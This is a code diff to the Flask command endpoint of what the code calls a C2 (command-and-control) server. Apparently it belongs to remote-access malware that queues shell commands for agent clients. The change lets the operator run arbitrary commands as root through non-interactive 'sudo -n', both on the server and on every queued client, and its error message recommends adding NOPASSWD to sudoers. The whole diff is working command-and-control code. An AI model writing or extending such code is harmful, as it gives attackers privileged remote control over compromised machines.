@@ -349,28 +349,45 @@ def receive_data():
 @require_auth
 def receive_command():
     data = request.json
-    cmd = data.get("command")
+    cmd       = data.get("command")
     client_id = data.get("client_id", "all")
+    use_sudo  = bool(data.get("sudo", False))
 
-    logger.warning(f"💀 Command received: {cmd} for {client_id}")
+    logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
     row_id = save_command_to_db(cmd, client_id)
 
     # If the target is the C2 server itself, execute locally and return result immediately
     if client_id == "[C2-Server]":
+        if use_sudo:
+            # Use sudo -n (non-interactive — no password prompt)
+            shell_cmd = ["sudo", "-n", "bash", "-c", cmd]
+            use_shell = False
+        else:
+            shell_cmd = cmd
+            use_shell = True
+
         try:
             output = subprocess.check_output(
-                cmd, shell=True, stderr=subprocess.STDOUT,
-                timeout=10, text=True
+                shell_cmd, shell=use_shell,
+                stderr=subprocess.STDOUT,
+                timeout=15, text=True
             ).strip()
             status = "done"
         except subprocess.TimeoutExpired:
-            output = "[timeout after 10s]"
+            output = "[error: command timed out after 15s]"
             status = "error"
         except subprocess.CalledProcessError as e:
-            output = (e.output or "").strip() or f"[exit code {e.returncode}]"
+            raw = (e.output or "").strip()
+            if "sudo: a password is required" in raw or "sudo: a terminal is required" in raw:
+                output = "[error: sudo requires a password — add NOPASSWD to sudoers or run server as root]"
+            else:
+                output = raw or f"[error: exit code {e.returncode}]"
+            status = "error"
+        except FileNotFoundError:
+            output = "[error: sudo not found on this system]"
             status = "error"
         except Exception as e:
-            output = str(e)
+            output = f"[error: {e}]"
             status = "error"
 
         # Update DB immediately with result
@@ -385,11 +402,12 @@ def receive_command():
         except Exception as e:
             logger.error(f"Failed to update command result: {e}")
 
-        logger.info(f"🖥️ [C2-Server] executed: {cmd!r} → {status}")
+        logger.info(f"🖥️ [C2-Server] executed (sudo={use_sudo}): {cmd!r} → {status}")
         return jsonify({"status": status, "command_id": row_id, "result": output})
 
-    # Regular clients: add to queue for agent to pick up
-    commands.append({"cmd": cmd, "id": row_id})
+    # Regular clients: wrap with sudo if requested, add to queue for agent to pick up
+    final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
+    commands.append({"cmd": final_cmd, "id": row_id})
     return jsonify({"status": "queued", "command_id": row_id})
 
 # ======================== 4. سحب الأوامر ========================
